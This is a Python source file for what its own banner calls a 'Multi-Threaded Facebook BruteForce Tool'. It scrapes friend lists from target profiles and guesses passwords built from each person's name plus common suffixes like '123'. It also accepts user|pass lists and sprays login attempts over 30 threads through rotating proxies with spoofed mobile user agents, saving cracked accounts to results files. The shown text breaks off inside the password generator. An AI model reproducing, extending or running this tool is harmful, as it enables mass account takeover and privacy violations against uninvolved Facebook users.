#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import requests
import json
import time
import datetime
import re
import random
import uuid
import sys
import urllib.parse
import base64
import gzip
import threading
import hmac
import hashlib
import struct
import io
import binascii
from concurrent.futures import ThreadPoolExecutor, as_completed
from Cryptodome import Random
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from datetime import datetime
from urllib.parse import urlencode
from time import sleep
from string import ascii_letters
from io import BytesIO

# Rich untuk tampilan (dengan fallback jika tidak ada)
try:
    from rich.panel import Panel
    from rich.console import Console
    from rich import print as rprint
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    def rprint(*args, **kwargs):
        print(*args)
    class Panel:
        def __init__(self, content, **kwargs):
            self.content = content
        def __str__(self):
            return str(self.content)

day = datetime.now().strftime("%d-%m-%Y")
temp_dump = []
file_result = {
    'success': f'results/success-{day}.txt',
    'checkpoint': f'results/checkpoint-{day}.txt'
}

log = {
    'loop': 0,
    'success': 0,
    'checkpoint': 0
}

# Daftar proxy
proxies_list = []
proxies_lock = threading.Lock()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def Banner():
    clear_terminal()
    logo = r"""[bold red]●[bold yellow] ●[bold green] ●[/]
[bold red]            ________  _______  ______
           / ____/  |/  / __ )/ ____/
[bold white]          / /_  / /|_/ / __  / /_    
         / __/ / /  / / /_/ / __/    
        /_/   /_/  /_/_____/_/       
                             
        [underline bright_black]Multi-Threaded Facebook BruteForce Tool[/]
        [bold bright_black]Author: KenXinDev[/]"""
    rprint(Panel(logo, width=80, style='bold bright_black'))

def KenXinInput():
    if RICH_AVAILABLE:
        return Console().input("[bold bright_black]   ╰─> ")
    else:
        return input("   ╰─> ")

def KenXin_Error(message: str):
    rprint(f'[bold bright_black]   ──> [bold red]{message}', end='\r')
    return None

def KenXin_Warning(message: str):
    rprint(f'[bold bright_black]   ──> [bold yellow]{message}', end='\r')
    return None

def create_folders():
    os.makedirs("results", exist_ok=True)
    os.makedirs("data", exist_ok=True)
    os.makedirs("temp", exist_ok=True)

# ==================== PROXY LOADER & VALIDATOR ====================
def validate_proxy(proxy):
    try:
        test_url = "http://httpbin.org/ip"
        proxies = {'http': proxy, 'https': proxy}
        r = requests.get(test_url, proxies=proxies, timeout=5)
        return r.status_code == 200
    except:
        return False

def getproxy(sock=False):
    data = []
    link = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all"
    protocol = "socks5" if sock is True else "socks4"
    try:
        resp = requests.get(link.format(protocol), stream=True, timeout=30)
        if resp.status_code == 200:
            for line in resp.iter_lines():
                if line:
                    data.append(line.decode().strip())
        return data
    except Exception as e:
        print(f"[!] Gagal mengambil proxy dari API: {e}")
        return []

def load_proxies():
    global proxies_list
    Banner()
    rprint(Panel("[bold white]Gunakan proxy?\n[1] Ya (ambil dari API)\n[2] Ya (dari file socks4.txt)\n[3] Tidak (tanpa proxy)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Proxy Settings] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
    choice = KenXinInput()
    raw_proxies = []
    if choice == '1':
        rprint("[bold yellow]Mengambil proxy dari API...[/]")
        raw_proxies = getproxy(False)
        if not raw_proxies:
            KenXin_Warning("API kosong, coba file local...")
            load_from_file()
            return
        raw_proxies = [f"socks4://{p}" for p in raw_proxies if ':' in p]
    elif choice == '2':
        proxy_file = "socks4.txt"
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or ':' not in line:
                        continue
                    ip, port = line.split(':', 1)
                    raw_proxies.append(f"http://{ip}:{port}")
            rprint(f"[bold yellow]✓ {len(raw_proxies)} proxy dari file[/]")
        else:
            KenXin_Warning("File socks4.txt tidak ditemukan, tanpa proxy.")
            proxies_list.clear()
            return
    else:
        rprint("[bold yellow]Berjalan tanpa proxy.[/]")
        proxies_list.clear()
        return

    if not raw_proxies:
        KenXin_Warning("Tidak ada proxy yang bisa digunakan.")
        proxies_list.clear()
        return

    rprint(f"[bold yellow]Memvalidasi {len(raw_proxies)} proxy...[/]")
    valid = []
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(validate_proxy, p): p for p in raw_proxies}
        for future in as_completed(futures):
            proxy = futures[future]
            if future.result():
                valid.append(proxy)
    proxies_list = valid
    rprint(f"[bold green]✓ {len(proxies_list)} proxy valid siap digunakan.[/]")
    if not proxies_list:
        KenXin_Warning("Tidak ada proxy valid, melanjutkan tanpa proxy.")

def get_random_proxy():
    with proxies_lock:
        if proxies_list:
            return random.choice(proxies_list)
    return None

def remove_proxy(proxy):
    with proxies_lock:
        if proxy in proxies_list:
            proxies_list.remove(proxy)

def load_from_file():
    global proxies_list
    proxy_file = "socks4.txt"
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                ip, port = line.split(':', 1)
                proxies_list.append(f"http://{ip}:{port}")
        rprint(f"[bold green]✓ Loaded {len(proxies_list)} proxy dari {proxy_file}[/]")
    else:
        KenXin_Warning("File socks4.txt tidak ditemukan, berjalan tanpa proxy.")
        proxies_list.clear()

# ==================== ENKRIPSI PASSWORD (VERSI BARU DENGAN CACHE & FALLBACK) ====================
class Encrypt_PWD:
    _public_key = None
    _key_id = None

    @classmethod
    def _fetch_public_key(cls):
        if cls._public_key and cls._key_id:
            return cls._public_key, cls._key_id
        try:
            url = 'https://b-graph.facebook.com/pwd_key_fetch'
            params = {
                'version': '2',
                'flow': 'CONTROLLER_INITIALIZATION',
                'method': 'GET',
                'fb_api_req_friendly_name': 'pwdKeyFetch',
                'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
                'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
            }
            resp = requests.get(url, params=params, timeout=10)
            resp.raise_for_status()
            data = resp.json()
            pub = data.get('public_key')
            kid = str(data.get('key_id', '25'))
            if pub:
                cls._public_key = pub
                cls._key_id = kid
                return pub, kid
        except Exception:
            pass
        return None, None

    def PWD_FB4A(self, password, public_key=None, key_id="25"):
        if public_key is None:
            public_key, key_id = self._fetch_public_key()
            if not public_key:
                return self._PWD_MSGR(password)
        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except Exception:
            return self._PWD_MSGR(password)

    @staticmethod
    def _PWD_MSGR(password, timestamp=None):
        if timestamp is None:
            timestamp = int(time.time())
        key_hex = "b6a5b6a5b6a5b6a5b6a5b6a5b6a5b6a5"
        key = bytes.fromhex(key_hex)
        h = hmac.new(key, password.encode('utf-8'), hashlib.sha256)
        hash_b64 = base64.b64encode(h.digest()).decode('utf-8')
        return f"#PWD_MSGR:2:{timestamp}:{hash_b64}"

# ==================== CLASS LoginFacebook (DENGAN GETTOKEN BARU) ====================
class LoginFacebook:
    def __init__(self):
        self.url = "https://business.facebook.com/business_locations"

    def login_cookie(self):
        try:
            self.cookie = open('data/cookie.txt', 'r', encoding='utf-8').read()
            self.token = open('data/token.txt', 'r', encoding='utf-8').read()
        except FileNotFoundError:
            Banner()
            rprint(Panel("[bold white]Masukan cookie facebook anda, pastikan anda menggunakan akun tumbal jangan menggunakan akun pribadi", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Required] <<[/]", subtitle="[bold bright_black]╭──────", subtitle_align="left"))
            coki = KenXinInput()
            if not coki:
                KenXin_Error("Invalid Cookie!!")
                sleep(3)
                self.login_cookie()
            try:
                with requests.Session() as session:
                    session.cookies.set('cookie', coki)
                    session.headers.update({
                        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
                        'referer': 'https://www.facebook.com/',
                        'host': 'business.facebook.com',
                        'origin': 'https://business.facebook.com',
                        'upgrade-insecure-requests': '1',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cache-control': 'max-age=0',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'content-type': 'text/html; charset=utf-8'
                    })
                    access_token = self.getToken(session)
                    if not access_token:
                        KenXin_Error("Invalid Cookie!! Gagal mendapatkan token.")
                        sleep(3)
                        self.login_cookie()
                    with open("data/cookie.txt", "w", encoding="utf-8") as f:
                        f.write(coki)
                    with open("data/token.txt", "w", encoding="utf-8") as f:
                        f.write(access_token)
                    rprint(Panel("[bold green]Login berhasil, silahkan jalankan ulang tools[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Successful] <<[/]"))
                    sleep(3)
                    sys.exit()
            except Exception as e:
                KenXin_Error("Error: " + str(e).title())
        nama, uid = self.checkCookie(self.cookie, self.token)
        Facebook(self.cookie, self.token, nama, uid).menu()

    def checkCookie(self, cookie, token):
        try:
            with requests.Session() as s:
                s.cookies.set("cookie", cookie)
                s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"})
                response = s.get(
                    'https://graph.facebook.com/me?fields=name,id&access_token={}'.format(token)
                )
                if response.status_code == 200:
                    data = response.json()
                    if 'name' in data and 'id' in data:
                        return data['name'], data['id']
                    else:
                        KenXin_Error("Cookie tidak valid!")
                        sleep(3)
                        os.remove("data/cookie.txt")
                        os.remove("data/token.txt")
                        self.login_cookie()
                else:
                    KenXin_Error("Gagal memeriksa cookie, pastikan cookie dan token valid!")
                    sleep(3)
                    os.remove("data/cookie.txt")
                    os.remove("data/token.txt")
                    self.login_cookie()
        except Exception as e:
            KenXin_Error("Error: " + str(e).title())
            sys.exit()

    def getToken(self, session):
        try:
            response = session.get(self.url)
            find_token = re.search(r'(EAAG\w+)', response.text)
            if find_token:
                return find_token.group(1)
            else:
                return None
        except requests.exceptions.ConnectionError:
            KenXin_Error("Tidak ada koneksi!")
            return None
        except Exception as e:
            KenXin_Error("Error mendapatkan token: " + str(e))
            return None

# ==================== CLASS Facebook (DUMP MASSAL & CRACK) ====================
class Facebook:
    def __init__(self, cookie, token, nama, uid):
        self.cookie = cookie
        self.token = token
        self.nama = nama
        self.idz = uid
        self.enc = Encrypt_PWD()

    def generate_facebook_user_agent(self) -> tuple:
        android_devices = [
            # OPPO
            {"model": "CPH2207", "build": "RP1A.200720.011", "brand": "OPPO"},
            {"model": "CPH2359", "build": "SP1A.210812.016", "brand": "OPPO"},
            {"model": "CPH2145", "build": "RP1A.200720.011", "brand": "OPPO"},
            {"model": "CPH1937", "build": "QP1A.190711.020", "brand": "OPPO"},
            {"model": "CPH2249", "build": "RKQ1.210614.002", "brand": "OPPO"},
            {"model": "CPH2205", "build": "RP1A.200720.011", "brand": "OPPO"},
            {"model": "CPH2387", "build": "TP1A.220624.014", "brand": "OPPO"},
            # Samsung
            {"model": "SM-A315F", "build": "RP1A.200720.012", "brand": "Samsung"},
            {"model": "SM-A525F", "build": "SP1A.210812.016", "brand": "Samsung"},
            {"model": "SM-G973F", "build": "QP1A.190711.020", "brand": "Samsung"},
            {"model": "SM-S908B", "build": "SP1A.210812.016", "brand": "Samsung"},
            {"model": "SM-M315F", "build": "QP1A.190711.020", "brand": "Samsung"},
            {"model": "SM-A135F", "build": "TP1A.220624.014", "brand": "Samsung"},
            {"model": "SM-A042F", "build": "TP1A.220624.014", "brand": "Samsung"},
            {"model": "SM-S918B", "build": "TP1A.220624.014", "brand": "Samsung"},
            # Vivo
            {"model": "V2029", "build": "QP1A.190711.020", "brand": "Vivo"},
            {"model": "V2050", "build": "RP1A.200720.012", "brand": "Vivo"},
            {"model": "V2141", "build": "SP1A.210812.016", "brand": "Vivo"},
            {"model": "V2130", "build": "SP1A.210812.016", "brand": "Vivo"},
            {"model": "V2338", "build": "TP1A.220624.014", "brand": "Vivo"},
            {"model": "V2301", "build": "TP1A.220624.014", "brand": "Vivo"},
            {"model": "V2219", "build": "TP1A.220624.014", "brand": "Vivo"},
        ]
        
        app_versions = [
            "460.0.0.70.120", "459.1.0.68.115", "458.2.0.66.110",
            "457.0.0.64.120", "456.1.0.67.111", "455.2.0.62.105",
            "461.0.0.72.114", "462.1.0.73.119",  # tambahan versi lebih baru
        ]
        
        chosen_locale = "id_ID"
        device = random.choice(android_devices)
        android_ver = f"{random.randint(7, 14)}.{random.randint(0, 1)}"
        density = round(random.uniform(1.0, 4.0), 1)
        width = random.choice([720, 1080, 1440])
        height = random.choice([1280, 1920, 2340, 2400, 2560])

        ua = (
            f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; "
            f"{device['model']} Build/{device['build']}) "
            f"[FBAN/FB4A;FBAV/{random.choice(app_versions)};"
            f"FBBV/{random.randint(400000000, 500000000)};"
            f"FBDM/{{density={density},width={width},height={height}}};"
            f"FBLC/{chosen_locale};"
            f"FBRV/0;FBCR/;FBMF/{device['brand']};FBBD/{device['brand']};"
            f"FBPN/com.facebook.katana;"
            f"FBDV/{device['model']};FBSV/{android_ver};"
            f"FBOP/1;FBCA/x86:armeabi-v7a;]"
        )
        return ua, chosen_locale

    def logo(self):
        Banner()
        rprint(Panel(f"[bold white]Name: [bold red]{self.nama}[/bold red]\nUid: [bold red]{self.idz}[/bold red]\nAccessToken: [bold red]{self.token[:20]}***[/]", style="bold bright_black", title="[bold bright_black]>> [Account Info] <<[/]", width=80))
        rprint(Panel("[bold white][01] Dump id publik (bisa massal)\n[02] Crack dari file dump (userid<=>fullname)\n[03] Check result crack\n[04] Crack dari file user|pass\n[00] Logout[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Tools Menu] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))

    def menu(self):
        self.logo()
        choose = KenXinInput()
        if not choose:
            KenXin_Error("Wrong Input")
            sleep(3)
            self.menu()
        elif choose in ('1', '01'):
            self.dumpId_public()
        elif choose in ('2', '02'):
            self.crack_from_dump_file()
        elif choose in ('3', '03'):
            self.check_results()
        elif choose in ('4', '04'):
            self.crack_from_file_pass()
        elif choose in ('0', '00'):
            if os.path.exists('data/token.txt'):
                os.remove('data/token.txt')
            if os.path.exists('data/cookie.txt'):
                os.remove('data/cookie.txt')
            sys.exit()
        else:
            KenXin_Error("Wrong Input")
            sleep(3)
            self.menu()

    # ==================== MENU 1: DUMP ID PUBLIK (MASSAL DENGAN KOMA) ====================
    def dumpId_public(self):
        try:
            rprint(Panel("[bold white]Masukan id target, bisa lebih dari satu (pisahkan dengan koma).\nContoh: 1000123456789,1000987654321\nPastikan pertemanan target bersifat publik dan memiliki teman[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Dump User] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
            input_ids = KenXinInput()
            if not input_ids:
                KenXin_Warning("Target jangan kosong!")
                sleep(3)
                self.dumpId_public()
                return

            # Split koma dan bersihkan
            id_list = [x.strip() for x in input_ids.split(',') if x.strip()]
            if not id_list:
                KenXin_Warning("Tidak ada ID valid!")
                sleep(3)
                self.dumpId_public()
                return

            global temp_dump
            temp_dump.clear()  # hapus data dump sebelumnya

            for targetId in id_list:
                rprint(f"[bold yellow]\nMemproses ID: {targetId}...[/]")
                self._dump_friends_web(targetId)

            # Simpan hasil gabungan
            timestamp = datetime.now().strftime("%H%M%S")
            file_path = f'temp/dump-massal-{timestamp}.txt'
            with open(file_path, 'w', encoding='utf-8') as f:
                for entry in temp_dump:
                    f.write(entry + '\n')
            rprint(f"[bold green]\n✓ Dump massal selesai: {len(temp_dump)} teman dari {len(id_list)} akun tersimpan ke {file_path}[/]")
            sleep(1)
            self.settings()

        except Exception as e:
            KenXin_Error("Error: " + str(e).title())
            sleep(2)
            self.menu()

    # ==================== METODE DUMP WEB (TANPA CLEAR DI DALAM) ====================
    def _dump_friends_web(self, userid):
        # Tidak ada temp_dump.clear() di sini agar bisa akumulasi massal
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })
                response = r.get(
                    f'https://web.facebook.com/profile.php?id={userid}&sk=friends_all',
                    cookies={'cookie': self.cookie}
                ).text

                if '"items":{"count":' not in response:
                    rprint(f"[bold red]   ╰─>[bold red] Akun @{userid} Tidak Ada Teman![/]")
                    time.sleep(2.5)
                    return

                total_teman = re.search(r'"items":{"count":(.*?)}', response).group(1)
                rprint(f"[bold blue]   ╰─>[bold white] Memiliki[bold green] {total_teman}[bold white] Teman...", end='\r')
                time.sleep(1.5)

                find_friends = re.findall(r'"id":"(\d+)","friendship_status":".*?","__isNode":".*?","gender":".*?","name":"(.*?)"', response)
                __user = re.search(r'"USER_ID":"(\d+)"', response).group(1)
                fb_dtsg = re.search(r'"DTSGInitData",\[\],{"token":"(.*?)"', response).group(1)
                jazoest = re.search(r'jazoest=(\d+)"', response).group(1)
                lsd = re.search(r'"LSD",\[\],{"token":"(.*?)"', response).group(1)
                cursor = re.search(r'"page_info":{"end_cursor":"(.*?)"', response).group(1)
                ids = re.search(r'"collectionToken":"(.*?)",', response).group(1)

                for uid, name in find_friends:
                    if uid in [x.split('<=>')[0] for x in temp_dump] or len(name) > 40:
                        continue
                    temp_dump.append(f"{uid}<=>{name}")
                    rprint(f"[bold blue]   ╰─>[bold yellow] Dump @{uid[:20]}/{len(temp_dump)} Username...         ", end='\r')
                    time.sleep(0.0007)

                self._next_cursor_friends(userid, __user, fb_dtsg, jazoest, lsd, cursor, ids)

        except KeyboardInterrupt:
            rprint("\r                                                                   ", end='\r')
        except RecursionError:
            KenXin_Error("RecursionError saat dump!")
            time.sleep(2)
        except json.decoder.JSONDecodeError:
            KenXin_Error("JSONDecodeError saat dump!")
            time.sleep(2)
        except Exception as e:
            KenXin_Error(f"Error saat dump {userid}: {str(e)}")
            time.sleep(2)

    def _next_cursor_friends(self, userid, __user, fb_dtsg, jazoest, lsd, cursor, ids):
        global temp_dump
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'ProfileCometAppCollectionListRendererPaginationQuery',
                'Host': 'web.facebook.com',
                'referer': f'https://web.facebook.com/profile.php?id={userid}&sk=friends_all',
                'x-fb-lsd': lsd,
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery',
                'lsd': lsd,
                'variables': json.dumps({"count":8,"cursor":cursor,"scale":1.5,"search":None,"id":ids}),
                'jazoest': jazoest,
                'doc_id': '6118528884928354',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post(
                'https://web.facebook.com/api/graphql/',
                data=data,
                cookies={'cookie': self.cookie}
            )
            find_all_user = re.findall(
                r'"gender":".*?","name":"(.*?)",.*?"__typename":"User","id":"\d+","__isEntity":"User","url":"https://web.facebook.com/(.*?)"}',
                response.text
            )
            for name, url in find_all_user:
                if 'profile.php?id=' in url:
                    uid = url.split('profile.php?id=')[1]
                else:
                    uid = url.split('/')[-1] if '/' in url else url
                if uid in [x.split('<=>')[0] for x in temp_dump] or len(name) > 40:
                    continue
                temp_dump.append(f"{uid}<=>{name}")
                rprint(f"[bold blue]   ╰─>[bold green] Dump @{uid[:20]}/{len(temp_dump)} Username...         ", end='\r')
                time.sleep(0.0007)

            if '"end_cursor"' in response.text and '"has_next_page":true' in response.text:
                try:
                    next_match = re.search(r'"end_cursor":"(.*?)","has_next_page":true}},"id":"(.*?)"', response.text)
                    if next_match:
                        self._next_cursor_friends(
                            userid, __user, fb_dtsg, jazoest, lsd,
                            next_match.group(1), next_match.group(2)
                        )
                except AttributeError:
                    KenXin_Error("AttributeError saat paginasi!")

    # ==================== MENU 2: CRACK DARI FILE DUMP ====================
    def crack_from_dump_file(self):
        rprint(Panel("[bold white]Crack dari file dump (format: userid<=>fullname)\n[1] Pilih dari file dump yang tersimpan di folder temp\n[2] Masukkan path file manual[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Crack Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
        pilihan = KenXinInput()
        if pilihan == '1':
            temp_files = [f for f in os.listdir("temp") if f.endswith(".txt")]
            if not temp_files:
                KenXin_Warning("Tidak ada file dump di folder temp!")
                sleep(2)
                self.menu()
                return
            rprint(Panel("[bold white]Pilih file dump yang ingin digunakan:[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Select Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
            for idx, f in enumerate(temp_files, start=1):
                rprint(f"[bold white]{idx}. {f}[/]")
            rprint("[bold white]0. Kembali ke menu[/]")
            choice = KenXinInput()
            if choice == '0':
                self.menu()
                return
            try:
                idx = int(choice) - 1
                if idx < 0 or idx >= len(temp_files):
                    KenXin_Warning("Pilihan tidak valid!")
                    sleep(2)
                    self.crack_from_dump_file()
                    return
                selected_file = temp_files[idx]
                file_path = os.path.join("temp", selected_file)
            except ValueError:
                KenXin_Warning("Input harus angka!")
                sleep(2)
                self.crack_from_dump_file()
                return
        elif pilihan == '2':
            rprint(Panel("[bold white]Masukkan path file dump (contoh: temp/dump-123456.txt)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Manual File Path] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
            file_path = KenXinInput()
            if not file_path:
                KenXin_Warning("Path file tidak boleh kosong!")
                sleep(2)
                self.crack_from_dump_file()
                return
            if not os.path.exists(file_path):
                KenXin_Warning(f"File '{file_path}' tidak ditemukan!")
                sleep(2)
                self.crack_from_dump_file()
                return
        else:
            KenXin_Warning("Pilihan tidak valid!")
            sleep(2)
            self.crack_from_dump_file()
            return

        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if '<=>' in line:
                        userid, fullname = line.split('<=>', 1)
                        accounts.append((userid.strip(), fullname.strip()))
                    else:
                        KenXin_Warning(f"Format baris tidak dikenali (harus userid<=>fullname): {line}")
        except Exception as e:
            KenXin_Error(f"Gagal membaca file: {e}")
            sleep(2)
            self.menu()
            return

        if not accounts:
            KenXin_Warning("File dump kosong atau format salah!")
            sleep(2)
            self.menu()
            return

        rprint(f"[bold green]✓ {len(accounts)} akun berhasil dimuat dari file dump.[/]")
        sleep(1)
        global temp_dump
        temp_dump = [f"{uid}<=>{nama}" for uid, nama in accounts]
        self.settings()

    # ==================== MENU 4: CRACK DARI FILE USER|PASS ====================
    def crack_from_file_pass(self):
        rprint(Panel("[bold white]Masukkan path file akun (format: user|password per baris)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Load File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
        file_path = KenXinInput()
        if not file_path:
            KenXin_Warning("File path tidak boleh kosong!")
            sleep(2)
            self.menu()
            return

        if not os.path.exists(file_path):
            KenXin_Warning(f"File '{file_path}' tidak ditemukan!")
            sleep(2)
            self.menu()
            return

        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if '|' not in line:
                        KenXin_Warning(f"Format baris tidak valid (harus user|pass): {line}")
                        continue
                    user, pwd = line.split('|', 1)
                    accounts.append((user.strip(), pwd.strip()))
        except Exception as e:
            KenXin_Error(f"Gagal membaca file: {e}")
            sleep(2)
            self.menu()
            return

        if not accounts:
            KenXin_Warning("Tidak ada akun valid di file!")
            sleep(2)
            self.menu()
            return

        rprint(f"[bold green]✓ {len(accounts)} akun berhasil dimuat.[/]")
        sleep(1)
        self.settings(accounts)

    # ==================== MENU 3: CHECK RESULT CRACK ====================
    def check_results(self):
        Banner()
        success_file = file_result['success']
        checkpoint_file = file_result['checkpoint']

        def count_lines(file_path, has_header=True):
            if not os.path.exists(file_path):
                return 0
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                count = len(lines)
                if has_header and count > 0:
                    if lines[0].startswith('#'):
                        count -= 1
                return count
            except:
                return 0

        success_count = count_lines(success_file, has_header=True)
        checkpoint_count = count_lines(checkpoint_file, has_header=False)

        info = f"""[bold white]📊 Statistik Hasil Crack[/bold white]
[bold green]✅ Sukses       : {success_count}[/bold green]
[bold yellow]⚠️  Checkpoint   : {checkpoint_count}[/bold yellow]
[bold bright_black]📁 File Sukses    : {success_file}
📁 File Checkpoint : {checkpoint_file}[/bold bright_black]"""

        rprint(Panel(info, width=80, style='bold bright_black', title='[bold bright_black]>> [Result Info] <<[/]'))
        rprint("[bold white]Tekan Enter untuk kembali ke menu...[/]")
        input()
        self.menu()

    # ==================== SETTINGS DAN EKSEKUSI ====================
    def settings(self, accounts=None):
        print()
        rprint(Panel('''[bold white]01. Nama 1-4            02. Nama 1-5
03. Nama 1-6            04. Nama 1-6 + Kombinasi manual
05. Manual Password     00. Back to Menu[/]''', style='bold bright_black', width=80, title='[bold bright_black]>> [Password Settings] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
        kombinasi = KenXinInput()
        if kombinasi in ('01','1'):
            self.exec_method(kombinasi, accounts=accounts)
        elif kombinasi in ('02','2'):
            self.exec_method(kombinasi, accounts=accounts)
        elif kombinasi in ('03','3'):
            self.exec_method(kombinasi, accounts=accounts)
        elif kombinasi in ('04','4'):
            rprint(Panel('[bold white]Masukan password kombinasi manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]',style='bold bright_black', width=80, title='[bold bright_black]>> [Kombinasi Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXinInput()
            if not manual_password:
                KenXin_Warning('Password manual harus diisi!!')
                sleep(3)
                self.settings(accounts)
            self.exec_method(kombinasi, manual_password, accounts)
        elif kombinasi in ('05','5'):
            rprint(Panel('[bold white]Masukan password manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [Manual Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXinInput()
            if not manual_password:
                KenXin_Warning('Password manual harus diisi!!')
                sleep(3)
                self.settings(accounts)
            self.exec_method(kombinasi, manual_password, accounts)
        elif kombinasi in ('00','0'):
            self.menu()
        else:
            KenXin_Warning('Wrong Input!!')
            time.sleep(3)
            self.settings(accounts)

    def exec_method(self, c, zx='', accounts=None):
        list_accounts = accounts if accounts is not None else temp_dump
        if not list_accounts:
            KenXin_Warning("Tidak ada akun untuk diproses!")
            sleep(2)
            self.menu()
            return

        with ThreadPoolExecutor(max_workers=30) as shinkai:
            for item in list_accounts:
                try:
                    if isinstance(item, str):
                        if item.count('<=>') != 1:
                            raise ValueError(f"Format tidak valid: {item}")
                        username, fullname = item.split('<=>')
                        passwords = self.generate_passwords(fullname, c, zx)
                    else:
                        username, password = item
                        passwords = [password]
                    shinkai.submit(self.smartlock_login, username, passwords)
                except Exception as e:
                    KenXin_Error(f'Terjadi error: {str(e)}')
                    time.sleep(3)
        print()
        rprint(Panel('[bold white]Crack telah selesai dengan hasil ok dan cp : [bold green]{}[/bold green]/[bold yellow]{}[/bold yellow][/]'.format(log["success"], log['checkpoint']), width=80, style='bold bright_black', title='[bold bright_black]>> [Facebook Info] <<[/]'))
        time.sleep(3)
        sys.exit()

    # ==================== GENERATE PASSWORD ====================
    def generate_passwords(self, name, kombinasi, zx=''):
        suffix_list = []
        if kombinasi in ['1', '01']:
            suffix_list = ['123', '1234', '321', '01', '02']
        elif kombinasi in ['2', '02']:
            suffix_list = ['123', '1234', '12345', '321', '01', '02']
        elif kombinasi in ['3', '03']:
            suffix_list = ['123', '1234', '12345', '321', '123456', '01', '02']
        elif kombinasi in ['4', '04']:
            suffix_list = ['123', '1234', '12345', '321', '123456', '01', '02']
            if zx:
                suffix_list.extend([s.strip() for s in zx.split(',') if s.strip()])
        elif kombinasi in ['5', '05']:
            suffix_list = [s.strip() for s in zx.split(',') if s.strip()] if zx else []

